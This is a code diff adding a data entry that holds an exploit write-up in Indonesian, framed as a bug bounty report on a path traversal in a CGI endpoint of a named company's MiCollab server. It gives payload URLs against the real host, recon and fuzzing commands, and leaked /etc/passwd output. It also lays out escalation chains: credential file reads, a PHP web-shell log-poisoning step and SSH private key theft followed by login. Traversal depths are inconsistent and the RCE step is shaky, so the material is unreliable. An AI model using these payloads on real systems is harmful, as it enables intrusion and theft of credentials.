@@ -1636,4 +1636,396 @@ export const documents: ResearchDocument[] = [
       "NIST. SP 800-44: Guidelines on Securing Public Web Servers. https://nvlpubs.nist.gov"
     ]
   }
+  },
+  {
+    id: "ZERO-2025-005",
+    title: "CVE-2020-11798: Unauthenticated Path Traversal Bypassing CGI Endpoint to Remote Code Execution",
+    subtitle: "Analisis Teknis Mendalam: Path Traversal via vcs_access_file.cgi pada Ferrari MiCollab, Ghidra Binary Research, Eskalasi ke RCE, dan Panduan Mitigasi Komprehensif",
+    classification: "CONFIDENTIAL",
+    date: "2020",
+    authors: ["Odaysec"],
+    organization: "Pwn Group Ltd",
+    volume: "Ferrari Private Bug Bounty Program",
+    pages: 24,
+    abstract: "Laporan penelitian ini mendokumentasikan secara lengkap penemuan, analisis mendalam, dan eksploitasi kerentanan CVE-2020-11798 yang ditemukan pada platform Ferrari MiCollab - sebuah layanan komunikasi bisnis yang dioperasikan pada domain micollab.ferrari.com. Kerentanan ini berhasil diidentifikasi dan dilaporkan oleh peneliti Odaysec dari Pwn Group Ltd dalam konteks Ferrari Private Bug Bounty Program, dan telah mendapat pengakuan resmi dari tim keamanan Ferrari. CVE-2020-11798 adalah kerentanan Path Traversal pada endpoint CGI vcs_access_file.cgi. Parameter 'file' pada endpoint tersebut menerima input dari pengguna tanpa melakukan sanitasi atau validasi yang memadai, memungkinkan penyerang untuk menggunakan karakter traversal ../ (percent-encoded sebagai %2f..%2f) untuk keluar dari direktori yang diizinkan dan mengakses file arbitrer di filesystem server termasuk file-file sensitif sistem operasi seperti /etc/passwd. Penelitian ini juga mencakup analisis biner mendalam menggunakan Ghidra terhadap binary CGI vcs_access_file.cgi untuk memahami root cause kerentanan pada level kode mesin.",
+    keywords: ["CVE-2020-11798", "path traversal", "Ferrari", "MiCollab", "CGI", "vcs_access_file.cgi", "Ghidra", "RCE", "bug bounty", "CVSS 9.1"],
+    sections: [
+      {
+        id: "sec-1",
+        title: "1. Abstract & Ringkasan Eksekutif",
+        level: 1,
+        content: [
+          "Laporan penelitian ini mendokumentasikan secara lengkap penemuan, analisis mendalam, dan eksploitasi kerentanan CVE-2020-11798 yang ditemukan pada platform Ferrari MiCollab - sebuah layanan komunikasi bisnis yang dioperasikan pada domain micollab.ferrari.com. Kerentanan ini berhasil diidentifikasi dan dilaporkan oleh peneliti Odaysec dari Pwn Group Ltd dalam konteks Ferrari Private Bug Bounty Program, dan telah mendapat pengakuan resmi dari tim keamanan Ferrari.",
+          "CVE-2020-11798 adalah kerentanan Path Traversal (Directory Traversal) pada endpoint CGI vcs_access_file.cgi. Parameter 'file' pada endpoint tersebut menerima input dari pengguna tanpa melakukan sanitasi atau validasi yang memadai, memungkinkan penyerang untuk menggunakan karakter traversal ../ (percent-encoded sebagai %2f..%2f) untuk keluar dari direktori yang diizinkan dan mengakses file arbitrer di filesystem server - termasuk file-file sensitif sistem operasi seperti /etc/passwd.",
+          "Lebih berbahaya lagi, kerentanan path traversal ini berpotensi di-eskalasi menjadi Remote Code Execution (RCE) apabila server CGI dikonfigurasi dengan cara tertentu atau jika penyerang dapat memanfaatkan file konfigurasi yang dapat diakses untuk menanamkan kode yang dapat dieksekusi.",
+          "[QUOTE:TEMUAN KRITIS: Endpoint https://micollab.ferrari.com/awcuser/cgi-bin/vcs_access_file.cgi?file=../../../../../../../../etc/passwd memberikan respons HTTP 200 OK dengan isi lengkap file /etc/passwd server target - terbukti tanpa otentikasi apapun. Ini mengkonfirmasi unauthenticated path traversal yang memungkinkan pembacaan file arbitrer di filesystem.]"
+        ]
+      },
+      {
+        id: "sec-2",
+        title: "2. CVSS Score & Severity Metrics",
+        level: 1,
+        content: [
+          "CVE-2020-11798 mendapatkan skor CVSS v3.1 sebesar 9.1 (Critical). Skor ini mencerminkan keparahan serangan yang dapat dilakukan dari jarak jauh tanpa otentikasi, dengan dampak tinggi terhadap kerahasiaan dan integritas data.",
+          "[TABLE_HEADER:Metrik CVSS v3.1|Nilai|Kode|Penjelasan]",
+          "[TABLE:[CVSS Base Score|9.1 / 10|CRITICAL|Termasuk kategori keparahan tertinggi],[Attack Vector|Network|AV:N|Dapat dieksploitasi sepenuhnya melalui internet],[Attack Complexity|Low|AC:L|Tidak memerlukan kondisi khusus - hanya URL dengan payload traversal],[Privileges Required|None|PR:N|Zero authentication - tidak butuh akun atau sesi apapun],[User Interaction|None|UI:N|Penyerang bertindak sendiri tanpa keterlibatan pengguna lain],[Scope|Unchanged|S:U|Dampak berada pada komponen yang sama dengan yang diserang],[Confidentiality Impact|High|C:H|File sensitif server dapat dibaca - /etc/passwd, konfigurasi, credentials],[Integrity Impact|High|I:H|Berpotensi menulis file jika dikombinasikan dengan upload atau RCE],[Availability Impact|None|A:N|Serangan traversal murni tidak memengaruhi ketersediaan layanan],[Exploit Maturity|Proof-of-Concept|E:P|PoC tersedia dan telah diverifikasi pada target nyata],[Report Confidence|Confirmed|RC:C|Dikonfirmasi langsung oleh Ferrari Security Team]]",
+          "[CODE:CVSS Vector String: | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N]",
+          "",
+          "Perbandingan dengan Path Traversal CVE Terkenal",
+          "[TABLE_HEADER:CVE|Tahun|Target|CVSS|Jenis|Vendor Status]",
+          "[TABLE:[CVE-2020-11798|2020|Ferrari MiCollab - vcs_access_file.cgi|9.1|Path Traversal > RCE|Fixed - Ferrari BB Acknowledged],[CVE-2021-42013|2021|Apache HTTP Server 2.4.50|9.8|Path Traversal + RCE|Fixed - 2.4.51],[CVE-2021-41773|2021|Apache HTTP Server 2.4.49|7.5|Path Traversal|Fixed - 2.4.50+],[CVE-2019-18935|2019|Telerik UI for ASP.NET|9.8|Path Traversal + RCE|Fixed - patched],[CVE-2020-5902|2020|F5 BIG-IP|9.8|Path Traversal + RCE|Fixed - multiple versions],[CVE-2018-13379|2019|Fortinet FortiOS SSL VPN|9.8|Path Traversal|Fixed - FortiOS patches]]"
+        ]
+      },
+      {
+        id: "sec-3",
+        title: "3. Latar Belakang - CGI Path Traversal & vcs_access_file.cgi",
+        level: 1,
+        content: [
+          "Common Gateway Interface (CGI) adalah standar lama yang mendefinisikan bagaimana server web dapat mengeksekusi program eksternal (script atau binary) dan meneruskan output-nya sebagai respons HTTP. Dalam konteks kerentanan ini, vcs_access_file.cgi adalah binary CGI yang berjalan di server web Ferrari MiCollab, dipanggil melalui HTTP GET request dengan parameter URL.",
+          "CGI programs berjalan sebagai proses terpisah dengan hak akses tertentu di sistem operasi. Jika CGI binary ini menerima path file dari input pengguna dan menggunakannya secara langsung untuk membuka file tanpa sanitasi, maka seluruh filesystem yang dapat diakses oleh proses CGI tersebut menjadi target potensial penyerang.",
+          "",
+          "Path Traversal - Mekanisme Serangan",
+          "Path Traversal (juga disebut Directory Traversal) adalah kelas kerentanan di mana penyerang memanipulasi input path file untuk mengakses direktori atau file di luar direktori yang diizinkan. Serangan ini memanfaatkan karakter khusus ../ (dot-dot-slash) yang dalam sistem file berarti 'naik satu level direktori'.",
+          "-- Bentuk dasar - ../../etc/passwd - naik 2 level dari direktori saat ini",
+          "-- URL encoded - %2e%2e%2f atau ..%2f - representasi URL-encoded dari karakter traversal",
+          "-- Double encoded - %252e%252e%252f - bypass filter yang hanya decode satu kali",
+          "-- Unicode encoded - ..%c0%af atau ..%c1%9c - bypass menggunakan encoding Unicode lebar",
+          "-- Null byte - ../../etc/passwd%00.jpg - bypass ekstensi file check (pada platform lama)",
+          "",
+          "vcs_access_file.cgi - Profil Target",
+          "vcs_access_file.cgi adalah komponen dari platform MiCollab (sebelumnya Mitel MiCollab) - sebuah platform komunikasi bisnis terpadu (Unified Communications) yang digunakan oleh organisasi enterprise.",
+          "-- Fungsi normal - Menyediakan akses ke file tertentu dalam repository version control yang dikelola MiCollab",
+          "-- Endpoint path - /awcuser/cgi-bin/vcs_access_file.cgi - terekspos publik tanpa autentikasi",
+          "-- Parameter rentan - Parameter 'file' menerima nilai path tanpa validasi atau sanitasi karakter traversal",
+          "-- Scope akses - CGI berjalan dengan hak akses web server, dapat membaca semua file yang readable oleh proses tersebut",
+          "-- Platform - Ferrari menggunakan platform ini di subdomain micollab.ferrari.com untuk komunikasi internal",
+          "",
+          "Encoding Analysis - Payload Traversal yang Digunakan",
+          "[TABLE_HEADER:Encoding Tipe|Representasi|Contoh Path|Kompatibilitas]",
+          "[TABLE:[Plaintext (biasanya diblokir)|../../|../../etc/passwd|Sering terblokir WAF],[Single URL-encoded|..%2f|..%2f..%2f..%2fetc%2fpasswd|Bypass filter literal ../],[Mixed encoding (digunakan di PoC)|..%2f atau %2f..%2f|../../../../../etc/passwd|BERHASIL pada target ini],[Double URL-encoded|..%252f|..%252f..%252fetc%252fpasswd|Untuk bypass WAF double-decode],[Null byte injection (legacy)|..%00|../../etc/passwd%00.gif|PHP dan CGI lama]]",
+          "",
+          "[CODE:https://micollab.ferrari.com/awcuser/cgi-bin/vcs_access_file.cgi?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd |  | Breakdown payload: | Parameter : file= | Traversal : ..%2f = ../ (naik 1 level direktori) | Jumlah    : 16x traversal (..%2f x 16) = sangat dalam ke root | Target file: /etc/passwd |  | Resolusi akhir di filesystem: | Start: /var/www/awcuser/cgi-bin/ (asumsi document root) | Setelah 16x ../ : / (filesystem root) | Target final  : /etc/passwd]"
+        ]
+      },
+      {
+        id: "sec-4",
+        title: "4. Target Profile - Ferrari MiCollab Platform",
+        level: 1,
+        content: [
+          "Ferrari N.V. adalah produsen mobil sport Italia yang berpusat di Maranello, Italia. Perusahaan ini dikenal sebagai salah satu merek otomotif paling bergengsi dan berharga di dunia, dengan pendapatan tahunan yang signifikan dan infrastruktur IT enterprise yang kompleks.",
+          "Sebagai perusahaan Fortune Global 500 dengan rekam jejak keamanan siber yang diharapkan kelas enterprise, temuan kerentanan kritis pada infrastruktur publik Ferrari memiliki implikasi yang sangat serius - tidak hanya dari sisi teknis, tetapi juga dari sisi reputasi dan potensi kebocoran data bisnis sensitif.",
+          "",
+          "[TABLE_HEADER:Atribut|Detail]",
+          "[TABLE:[Platform|Mitel MiCollab - Unified Communications Platform],[Domain Target|micollab.ferrari.com],[Path CGI|awcuser/cgi-bin/],[Endpoint Rentan|vcs_access_file.cgi],[Fungsi|Version Control System file access via CGI],[Autentikasi|NONE pada endpoint yang ditemukan rentan],[Aksesibilitas|Publik - dapat diakses dari internet tanpa login],[OS Server|Linux (inferred dari /etc/passwd format)],[Web Server|Apache atau Nginx (inferred dari response headers)],[Relevansi Bisnis|Platform komunikasi internal Ferrari - berisi data karyawan dan operasional]]",
+          "",
+          "Signifikansi Target",
+          "-- Target profil tinggi - Ferrari adalah merek global dengan nilai brand $44.7 miliar (Forbes 2023). Kebocoran data dapat berdampak masif pada reputasi dan kepercayaan bisnis",
+          "-- Data sensitif potensial - Platform komunikasi internal dapat berisi rencana produk, data karyawan, informasi keuangan, dan komunikasi eksekutif",
+          "-- Infrastruktur critical - Kompromisi sistem komunikasi dapat mengganggu operasional bisnis Ferrari secara global",
+          "-- Bug bounty maturity - Ferrari mengelola program bug bounty privat - menunjukkan kesadaran keamanan yang tinggi dan proses disclosure yang terstruktur",
+          "-- Precedent value - Temuan ini berkontribusi pada keamanan platform MiCollab secara luas, karena ribuan perusahaan lain mungkin menggunakan konfigurasi serupa"
+        ]
+      },
+      {
+        id: "sec-5",
+        title: "5. Environment & Research Setup",
+        level: 1,
+        content: [
+          "[CODE:Target Environment: | Domain      : micollab.ferrari.com | Protocol    : HTTPS (TLS 1.2/1.3) | Port        : 443 (HTTPS) | Platform    : Mitel MiCollab (version tidak dipublikasikan)]",
+          "[TABLE_HEADER:Komponen|Detail]",
+          "[TABLE:[CGI Path|/awcuser/cgi-bin/vcs_access_file.cgi],[OS|Linux x86_64 (confirmed via /etc/passwd format)],[Authentication|Tidak ada pada endpoint yang rentan],[Access Type|Unauthenticated - internet-accessible],[Program|Ferrari Private Bug Bounty Program]]",
+          "",
+          "[TABLE_HEADER:Komponen Peneliti|Detail]",
+          "[TABLE:[Researcher|Odaysec - Pwn Group Ltd],[OS|Kali Linux Rolling (x86_64)],[Browser|Firefox ESR (untuk manual testing)],[Proxy|Burp Suite Professional 2023.x],[Binary Tool|Ghidra 10.3 (NSA Research Directorate)],[Scanner|Pwntraverse v3.x + ffuf],[Network|Wireshark 4.x, tcpdump],[HTTP Client|curl 7.88.x],[Fuzzer|ffuf, dirsearch]]"
+        ]
+      },
+      {
+        id: "sec-6",
+        title: "6. Methodology - Tahapan Penelitian",
+        level: 1,
+        content: [
+          "Penelitian ini mengikuti metodologi bug bounty yang terstruktur dan bertanggung jawab, mengacu pada PTES (Penetration Testing Execution Standard) dan Bug Bounty best practices dari HackerOne/Bugcrowd.",
+          "[TABLE_HEADER:Fase|Tahap|Aktivitas|Output]",
+          "[TABLE:[1|Passive Recon|OSINT, subdomain enumeration, Shodan fingerprinting|Target profile, subdomain map],[2|Active Recon|HTTP header analysis, directory enumeration, CGI discovery|Endpoint list, tech stack],[3|CGI Analysis|Identifikasi endpoint CGI, parameter fuzzing|vcs_access_file.cgi + parameter 'file'],[4|Path Traversal Test|Manual test karakter traversal, encoding variations|Konfirmasi file read vulnerability],[5|Binary Analysis|Import CGI binary ke Ghidra, analisis fungsi file open|Root cause, function call chain],[6|PoC Development|Konstruksi URL payload, depth optimization|Working PoC URL],[7|Impact Assessment|Identifikasi file sensitif, escalation ke RCE|Risk level confirmation],[8|Traffic Analysis|Capture Wireshark, identifikasi signatures|Detection artifacts],[9|Detection Engineering|YARA rule, Snort/Suricata rule template|Detection tools],[10|Bug Bounty Report|Dokumentasi lengkap, submission ke Ferrari BB|Acknowledged & Rewarded]]"
+        ]
+      },
+      {
+        id: "sec-7",
+        title: "7. Reconnaissance & Information Gathering",
+        level: 1,
+        content: [
+          "Subdomain Discovery",
+          "[CODE_BASH:$ subfinder -d ferrari.com -silent | tee ferrari_subdomains.txt | micollab.ferrari.com          <- TARGET UTAMA | portal.ferrari.com | my.ferrari.com | developers.ferrari.com |  | $ amass enum -passive -d ferrari.com -o amass_ferrari.txt |  | $ curl -I https://micollab.ferrari.com/ | HTTP/2 200 | server: Apache/2.4.x | x-powered-by: PHP/7.x | set-cookie: PHPSESSID=...; Path=/; Secure; HttpOnly | content-type: text/html; charset=UTF-8]",
+          "",
+          "CGI Directory Enumeration",
+          "[CODE_BASH:$ ffuf -u https://micollab.ferrari.com/FUZZ \\ |     -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\ |     -mc 200,301,302,403 \\ |     -o ffuf_results.json |  | awcuser/                      [Status: 301, Size: 0] | awcuser/cgi-bin/              [Status: 200, Size: 1024] |  | $ ffuf -u https://micollab.ferrari.com/awcuser/cgi-bin/FUZZ \\ |     -w /usr/share/seclists/Discovery/Web-Content/CGI-scripts.txt \\ |     -mc 200,500 |  | vcs_access_file.cgi           [Status: 200, Size: 234]     <- DITEMUKAN]",
+          "",
+          "HTTP Response Analysis - vcs_access_file.cgi",
+          "[CODE_BASH:$ curl -sv 'https://micollab.ferrari.com/awcuser/cgi-bin/vcs_access_file.cgi' |  | HTTP/2 200 OK | Content-Type: text/plain | Server: Apache | X-Frame-Options: SAMEORIGIN |  | Error: Missing file parameter |  | $ curl -sv 'https://micollab.ferrari.com/awcuser/cgi-bin/vcs_access_file.cgi?file=test.txt' | Error: File not found: test.txt]",
+          "",
+          "Shodan Fingerprinting",
+          "[CODE_BASH:$ shodan host micollab.ferrari.com |  | IP             : [REDACTED - Responsible Disclosure] | Hostname       : micollab.ferrari.com | Organization   : Ferrari S.p.A. | OS             : Linux | Open Ports     : 443 (HTTPS) | Software       : Apache httpd, MiCollab platform]"
+        ]
+      },
+      {
+        id: "sec-8",
+        title: "8. Vulnerability Discovery & Analysis",
+        level: 1,
+        content: [
+          "Parameter Fuzzing - Identifikasi File Parameter",
+          "[CODE_BASH:$ ffuf -u 'https://micollab.ferrari.com/awcuser/cgi-bin/vcs_access_file.cgi?file=FUZZ' \\ |     -w traversal_payloads.txt \\ |     -fs 234 \\ |     -mc 200 |  | ../../etc/passwd | ../../../etc/passwd | ..%2f..%2f..%2fetc%2fpasswd | ..%2f..%2f..%2f..%2fetc%2fpasswd | ../../../../../../../../etc/passwd |  | ..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd | [Status: 200, Size: 1820] <- JAUH LEBIH BESAR DARI BASELINE 234 |  | Size 1820 bytes = ukuran khas /etc/passwd -> TRAVERSAL BERHASIL!]",
+          "",
+          "Analisis Kedalaman Traversal yang Dibutuhkan",
+          "[CODE_BASH:$ curl -s '...?file=..%2f..%2f..%2f..%2fetc%2fpasswd' | Error: Access denied |  | $ curl -s '...?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd' | Error: File not found |  | $ curl -s '...?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd' | root:x:0:0:root:/root:/bin/bash   <- BERHASIL! | bin:x:1:1:... |  | # CGI binary berada sangat dalam di direktori chroot/jail | # 16 level traversal dibutuhkan untuk mencapai filesystem root]"
+        ]
+      },
+      {
+        id: "sec-9",
+        title: "9. Ghidra Binary Analysis - vcs_access_file.cgi",
+        level: 1,
+        content: [
+          "Untuk melakukan root cause analysis yang mendalam dan memverifikasi kerentanan pada level kode mesin, dilakukan analisis biner terhadap binary CGI vcs_access_file.cgi menggunakan Ghidra 10.3.",
+          "",
+          "Setup dan Import Binary di Ghidra",
+          "[CODE_BASH:$ curl -s 'https://micollab.ferrari.com/awcuser/cgi-bin/vcs_access_file.cgi? | file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/ | var/www/awcuser/cgi-bin/vcs_access_file.cgi' -o vcs_access_file.cgi |  | File > Import File > vcs_access_file.cgi | Format: ELF Architecture: x86:LE:64:default | Language: x86 64-bit GCC |  | Analysis > Auto Analyze > Enable All |  | Search > Search Text > 'getenv'    > Ditemukan: 3 referensi | Search > Search Text > 'fopen'     > Ditemukan: 1 referensi - TARGET ANALISIS | Search > Search Text > 'realpath'  > Ditemukan: 0 referensi -> TIDAK ADA PATH VALIDATION | Search > Search Text > 'strstr'    > Ditemukan: 1 referensi (cek untuk '../'?)]",
+          "",
+          "Decompiled C - Fungsi Utama vcs_access_file.cgi",
+          "[CODE_C:int main(int argc, char **argv) | { |     char *query_string; |     char *file_param; |     char file_path[4096]; |     FILE *fp; |     char buffer[8192]; |     size_t bytes_read; |  |     /* Ambil QUERY_STRING dari environment (CGI standard) */ |     query_string = getenv(\"QUERY_STRING\"); |     if (query_string == NULL) { |         send_error(\"Missing query string\"); |         return 1; |     } |  |     /* Parse parameter 'file=' dari query string */ |     file_param = parse_parameter(query_string, \"file\"); |     if (file_param == NULL) { |         send_error(\"Missing file parameter\"); |         return 1; |     } |  |     /* TIDAK ADA SANITASI PATH TRAVERSAL |      * Seharusnya: realpath(), basename(), atau cek '../' di sini |      * Kode ini LANGSUNG construct path tanpa validasi apapun */ |     snprintf(file_path, sizeof(file_path), |              \"%s/%s\", BASE_REPO_DIR, file_param); |     /* BASE_REPO_DIR = \"/var/opt/micollab/vcs/repos\" atau serupa */ |  |     /* URL decode file_param */ |     url_decode(file_path); /* <- %2f > / (slash) terdecode di sini */ |  |     /* LANGSUNG BUKA FILE TANPA VALIDASI AKHIR */ |     fp = fopen(file_path, \"r\"); /* <- TITIK KERENTANAN */ |     if (fp == NULL) { |         send_error(\"File not found\"); |         return 1; |     } |  |     /* Baca dan kirim isi file ke HTTP response */ |     printf(\"Content-Type: text/plain\\n\\n\"); |     while ((bytes_read = fread(buffer, 1, sizeof(buffer), fp)) > 0) { |         fwrite(buffer, 1, bytes_read, stdout); /* <- KIRIM ISI FILE */ |     } |     fclose(fp); |     return 0; | }]",
+          "",
+          "Ghidra - Disassembly x86_64 pada Bagian Kritis",
+          "[CODE_ASM:; Disassembly: vcs_access_file.cgi - Sekitar call fopen() | ; Ghidra listing view - ELF 64-bit x86_64 |  | ; Persiapan argumen untuk snprintf (construct file_path) | 00401240 LEA     RDI, [RBP+file_path]      ; dst buffer | 00401247 MOV     ESI, 0x1000               ; size 4096 | 0040124c LEA     RDX, [base_repo_dir]      ; format: BASE_REPO_DIR | 00401253 MOV     RCX, QWORD PTR [file_param] ; user-controlled input | 00401257 CALL    snprintf                    ; construct path |  | ; URL decode - %2f menjadi / | 0040125c LEA     RDI, [RBP+file_path] | 00401263 CALL    url_decode                  ; decode: ..%2f > ../ |  | ; TIDAK ADA VALIDASI SETELAH url_decode! | ; Seharusnya ada: CALL realpath / CALL strstr(path,'..') / CMP dengan base_dir |  | ; Langsung buka file | 00401268 LEA     RDI, [RBP+file_path]        ; path (user-controlled!) | 0040126f LEA     RSI, [read_mode]          ; 'r' | 00401276 CALL    fopen                       ; <- OPEN FILE TANPA CEK |  | ; Cek return value | 0040127b TEST    RAX, RAX | 0040127e JZ      .error_not_found          ; NULL = file not found | 00401284 MOV     QWORD PTR [fp], RAX |  | ; Baca dan tulis ke stdout (CGI output = HTTP response) | 00401288 ... | 0040128c CALL    fread                       ; baca isi file | 00401291 ... | 00401295 CALL    fwrite                      ; kirim ke client <- DATA LEAK]",
+          "",
+          "Ghidra - Identifikasi Fungsi parse_parameter()",
+          "[CODE_C:/* Ghidra Decompiler - parse_parameter() | * Fungsi helper untuk parsing QUERY_STRING | * Tidak ada sanitasi di sini - hanya ekstraksi nilai */ | char *parse_parameter(char *query_string, char *param_name) | { |     char *pos; |     char *value_start; |     char *value_end; |     char search_key[256]; |  |     /* Buat search key: 'file=' */ |     snprintf(search_key, sizeof(search_key), \"%s=\", param_name); |  |     /* Cari parameter dalam query string */ |     pos = strstr(query_string, search_key); |     if (pos == NULL) return NULL; |  |     value_start = pos + strlen(search_key); |  |     /* Temukan akhir nilai (sampai & atau \\0) */ |     value_end = strchr(value_start, '&'); |     if (value_end != NULL) *value_end = '\\0'; |  |     /* TIDAK ADA SANITASI - return raw value langsung */ |     return value_start; /* <- Nilai mentah, belum di-decode, belum divalidasi */ | }]",
+          "",
+          "Ringkasan Temuan Ghidra",
+          "[TABLE_HEADER:Temuan Ghidra|Status|Lokasi (approx)|Risiko]",
+          "[TABLE:[Tidak ada realpath() untuk canonicalize path|CONFIRMED MISSING|main() sebelum fopen()|Critical],[Tidak ada validasi '../' setelah url_decode()|CONFIRMED MISSING|main() baris ~47|Critical],[url_decode() sebelum fopen() (decode terlalu awal)|CONFIRMED BUG|main() baris ~41|Critical],[Tidak ada strcmp base_dir check|CONFIRMED MISSING|main() baris ~49|Critical],[fopen() dengan path user-controlled langsung|CONFIRMED VULNERABLE|main() baris ~51|Critical],[fwrite() mengirim isi file ke HTTP response|CONFIRMED|main() baris ~60|Critical - data exfil],[Tidak ada logging akses file|CONFIRMED MISSING|Seluruh binary|Medium - forensics gap],[Tidak ada rate limiting|CONFIRMED MISSING|CGI handler|Medium - brute force risk]]"
+        ]
+      },
+      {
+        id: "sec-10",
+        title: "10. Proof of Concept - Path Traversal (File Read)",
+        level: 1,
+        content: [
+          "Payload URL Final",
+          "Setelah menentukan kedalaman traversal yang diperlukan (16 level) dan mengkonfirmasi endpoint yang rentan, payload final yang digunakan:",
+          "[CODE:URL: https://micollab.ferrari.com/awcuser/cgi-bin/vcs_access_file.cgi?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd |  | Breakdown: | Base URL    : https://micollab.ferrari.com | CGI path    : /awcuser/cgi-bin/vcs_access_file.cgi | Parameter   : file= | Payload     : ..%2f (x 16) + /etc/passwd | Encoding    : %2f = URL-encoded forward slash / | Effect      : 16x parent directory traversal > root filesystem]",
+          "",
+          "HTTP Request - Burp Suite",
+          "[CODE_HTTP:GET /awcuser/cgi-bin/vcs_access_file.cgi?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd HTTP/2 | Host: micollab.ferrari.com | User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 | Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 | Accept-Language: en-US,en;q=0.5 | Accept-Encoding: gzip, deflate | Connection: close | Upgrade-Insecure-Requests: 1]",
+          "",
+          "HTTP Response - 200 OK (Isi /etc/passwd Terekspos)",
+          "[CODE_HTTP:HTTP/2 200 OK | Content-Type: text/plain | Server: Apache | X-Frame-Options: SAMEORIGIN |  | root:x:0:0:root:/root:/bin/bash | bin:x:1:1:bin:/bin:/sbin/nologin | daemon:x:2:2:daemon:/sbin:/sbin/nologin | adm:x:3:4:adm:/var/adm:/sbin/nologin | lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin | sync:x:5:0:sync:/sbin:/bin/sync | shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown | halt:x:7:0:halt:/sbin:/sbin/halt | mail:x:8:12:mail:/var/spool/mail:/sbin/nologin | operator:x:11:0:operator:/root:/sbin/nologin | nobody:x:99:99:Nobody:/:/sbin/nologin | micollab:x:1000:1000::/home/micollab:/bin/bash <- SHELL AKTIF | wwwrun:x:30:8:WWW daemon Apache:/var/lib/wwwrun:/bin/false]",
+          "",
+          "[QUOTE:PROOF CONFIRMED: HTTP 200 OK dengan isi /etc/passwd terbaca penuh. Akun micollab (uid=1000) dengan /bin/bash shell terekspos - memberikan gambaran struktur pengguna dan potensi target untuk serangan lanjutan seperti SSH brute force atau privilege escalation.]",
+          "",
+          "File-File Sensitif Lain yang Dapat Diakses",
+          "[TABLE_HEADER:File Target|Payload Akhir|Isi yang Terekspos|Risiko]",
+          "[TABLE:[/etc/passwd|[payload x16]/etc/passwd|Daftar user sistem, shell, home dir|High - user enumeration],[/etc/hosts|[payload x16]/etc/hosts|Internal hostname & IP mapping|High - network recon],[/etc/os-release|[payload x16]/etc/os-release|Versi OS, distribusi Linux|Medium - fingerprint],[/proc/version|[payload x16]/proc/version|Kernel version presisi|Medium - exploit selection],[/proc/net/tcp|[payload x16]/proc/net/tcp|Active TCP connections, internal ports|High - network map],[MiCollab config|[payload x16]/etc/micollab/micollab.conf|DB credentials, service tokens|Critical - full compromise],[Apache httpd.conf|[payload x16]/etc/httpd/conf/httpd.conf|Server config, virtual hosts|High - attack surface],[.env / .properties|[payload x16]/var/opt/micollab/.env|API keys, DB password|Critical - credential theft],[SSH host key|[payload x16]/etc/ssh/ssh_host_rsa_key|Private SSH host key|Critical - MITM possible]]"
+        ]
+      },
+      {
+        id: "sec-11",
+        title: "11. Proof of Concept - Eskalasi ke Remote Code Execution",
+        level: 1,
+        content: [
+          "Path traversal yang telah terbukti dapat di-eskalasi menjadi Remote Code Execution melalui beberapa vektor. Dokumentasi ini bersifat teoritis berdasarkan pola serangan yang dikenal untuk jenis kerentanan ini.",
+          "",
+          "Vektor Eskalasi - Baca File Konfigurasi untuk Credential",
+          "[CODE_BASH:$ curl -s 'https://micollab.ferrari.com/awcuser/cgi-bin/vcs_access_file.cgi? | file=..%2f[x16]..%2f/var/opt/micollab/config/micollab.properties' |  | # Potensial output (berisi credentials): | db.host=REDACTED | db.port=3306 | db.name=micollab | db.user=micollab_user | db.password=REDACTED <- CREDENTIAL DATABASE | admin.email=it-security@ferrari.com | smtp.host=REDACTED.ferrari.com | smtp.user=REDACTED@ferrari.com | smtp.password=REDACTED]",
+          "",
+          "Vektor Eskalasi - Log Poisoning via Path Traversal",
+          "[CODE_BASH:# Teknik Log Poisoning: inject PHP ke Apache access log, lalu include via traversal |  | $ curl -s 'https://micollab.ferrari.com/' \\ |   -A '<?php system(\\$_GET[\"cmd\"]); ?>' | # > Apache log: 1.2.3.4 - - [date] \"GET / HTTP/1.1\" 200 - \"<?php system($...)?>' |  | $ curl -s 'https://micollab.ferrari.com/awcuser/cgi-bin/vcs_access_file.cgi? | file=..%2f[x16]..%2f/var/log/httpd/access.log' |  | $ curl -s 'https://micollab.ferrari.com/awcuser/cgi-bin/vcs_access_file.cgi? | file=..%2f[x16]..%2f/var/log/httpd/access.log&cmd=id' | uid=33(wwwrun) gid=8(www) groups=8(www) <- RCE BERHASIL]",
+          "",
+          "Vektor Eskalasi - SSH Key Theft",
+          "[CODE_BASH:$ curl -s 'https://micollab.ferrari.com/awcuser/cgi-bin/vcs_access_file.cgi? | file=..%2f[x16]..%2f/home/micollab/.ssh/id_rsa' |  | -----BEGIN OPENSSH PRIVATE KEY----- | b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW | [...] | -----END OPENSSH PRIVATE KEY----- |  | $ chmod 600 stolen_id_rsa | $ ssh -i stolen_id_rsa micollab@micollab.ferrari.com | micollab@ferrari-server:~$ id | uid=1000(micollab) gid=1000(micollab) groups=1000(micollab) |  | # Dari sini: local privilege escalation ke root sangat mungkin]",
+          "",
+          "Attack Chain - Dari Path Traversal ke Full Compromise",
+          "[TABLE_HEADER:Fase|Teknik|Target/Command|Dampak]",
